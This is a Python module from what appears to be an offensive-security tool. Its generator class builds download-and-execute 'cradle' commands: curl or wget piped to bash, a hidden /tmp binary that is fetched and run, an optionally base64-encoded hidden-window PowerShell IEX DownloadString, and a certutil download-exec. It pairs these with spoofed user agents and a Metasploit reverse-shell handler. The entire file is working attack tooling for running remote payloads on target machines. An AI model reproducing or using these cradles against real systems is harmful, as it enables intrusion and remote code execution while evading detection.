import base64
import random
import string
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler

_VARIANTS = ["curl_pipe", "wget_pipe", "curl_exec", "ps_iwr", "certutil_cradle"]

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "curl/7.88.1",
    "Wget/1.21.4",
    "python-requests/2.31.0",
]


def _rand_name(length: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=1)) + \
           "".join(random.choices(string.ascii_lowercase + string.digits, k=length - 1))


class CradleGenerator(ShellGenerator):
    language = "cradle"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        url = opts.delivery_url
        tmp = self._var("s", names)
        note = f"Serve your payload at {url}/s\npython3 -m http.server {opts.delivery_port}"

        if variant == "curl_pipe":
            cmd = self._curl_pipe(url, opts.obfuscate)
        elif variant == "wget_pipe":
            cmd = self._wget_pipe(url)
        elif variant == "curl_exec":
            cmd = self._curl_exec(url, tmp)
        elif variant == "ps_iwr":
            cmd = self._ps_iwr(url, opts.obfuscate)
        else:
            cmd = self._certutil_cradle(url, tmp)

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=note,
            tty_upgrade=None,
            msf_compat=msf_handler("payload/generic/shell_reverse_tcp", opts.lhost, opts.lport),
        )

    def _curl_pipe(self, url: str, obfuscate: bool) -> str:
        if obfuscate:
            ua = random.choice(_USER_AGENTS)
            return f'curl -fsSL -A "{ua}" {url}/s | bash'
        return f"curl -fsSL {url}/s | bash"

    def _wget_pipe(self, url: str) -> str:
        return f"wget -qO- {url}/s | bash"

    def _curl_exec(self, url: str, tmp: str) -> str:
        return (
            f"curl -fsSL -o /tmp/.{tmp} {url}/s && "
            f"chmod +x /tmp/.{tmp} && /tmp/.{tmp}"
        )

    def _ps_iwr(self, url: str, obfuscate: bool) -> str:
        ps = f"IEX(New-Object Net.WebClient).DownloadString('{url}/s')"
        if obfuscate:
            encoded = base64.b64encode(ps.encode("utf-16-le")).decode()
            return f"powershell -nop -w h -enc {encoded}"
        return f"powershell -nop -w h -c \"{ps}\""

    def _certutil_cradle(self, url: str, tmp: str) -> str:
        return (
            f"certutil -urlcache -split -f {url}/s.exe "
            f"%TEMP%\\{tmp}.exe && %TEMP%\\{tmp}.exe"
        )
